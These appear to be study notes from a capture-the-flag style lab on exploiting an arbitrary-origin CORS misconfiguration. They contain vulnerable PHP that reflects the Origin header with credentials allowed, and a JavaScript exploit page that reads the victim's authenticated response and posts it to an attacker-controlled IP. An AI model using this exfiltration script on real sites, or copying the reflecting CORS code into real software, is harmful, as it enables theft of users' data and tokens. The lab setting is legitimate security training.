Exploiting an Arbitrary Origin vulnerability is relatively easy compared to other CORS vulnerabilities since the application accepts cross-origin requests from any domain name. For example, below is the vulnerable code of [http://corssop.thm/arbitrary.php](http://corssop.thm/arbitrary.php):

```php
if (isset($_SERVER['HTTP_ORIGIN'])){
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

The code above implements a flawed CORS policy since it echoes back the `Origin` header from the client request in the `Access-Control-Allow-Origin` header without proper validation. An attacker might use an origin like `http://evilcors.thm` and the server will echo it back.
	![](Pasted%20image%2020250206093945.png)

The exploit server has an existing JavaScript code that makes cross-origin requests to the target application. To exploit the vulnerable code above, go to attacker server [http://exploit.evilcors.thm](http://exploit.evilcors.thm/)  where this exploit is stored for delivery.
```html
<html>
  <head>
  <title>Data Exfiltrator Exploit</title>
  <script>
    //Function which will make CORS request to target application web page to grab the HTTP response
    function exploit() {
	    var xhttp = new XMLHttpRequest();
	    xhttp.onreadystatechange = function() {
	      if (this.readyState == 4 && this.status == 200) {
	        var all = this.responseText;
	        exfiltrate(all);
	     }
	    };
	    xhttp.open("GET", "{http://corssop.thm/arbitrary.php}", true);
	    xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
	    xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	    xhttp.withCredentials = true;
	    xhttp.send();
	    }

    function exfiltrate(data_all) {
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "{http://10.10.126.60:{81}/receiver.php}", true); //Replace the URL with attacker controlled Server

          xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
          xhr.withCredentials = true;
          var body = data_all;
          var aBody = new Uint8Array(body.length);
          for (var i = 0; i < aBody.length; i++)
            aBody[i] = body.charCodeAt(i);
          xhr.send(new Blob([aBody]));
    }
    </script>
    
</head>
<body onload="exploit()">
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
<textarea id="load" style="width: 1183px; height: 305px;">```

![](Pasted%20image%2020250206103242.png)

Once done with the updates, click the Save button. To verify if the exploit is working, click the **View exploit** button. This will open a new tab containing the exploit code saved in the hosting server.

In the newly open tab, open Developer tools > Network. There should be two XHR connections. The first request is sent to the target website, while the second is sent to the exfiltrating server.

![](Pasted%20image%2020250206120443.png)
	![](Pasted%20image%2020250206121704.png)
![](Pasted%20image%2020250206125027.png)	![](Pasted%20image%2020250206122539.png)

now the request is captured on our attack machine on data.txt file	
	![](Pasted%20image%2020250206122100.png)

In the real world, if the target response includes sensitive data like user data, tokens, and API tokens, your JavaScript can capture this and potentially send it to a server under your control. 

To summarize, below is the entire process of the exploitation once the user clicks or visits the hosted exploit code:
	![](Pasted%20image%2020250206122811.png)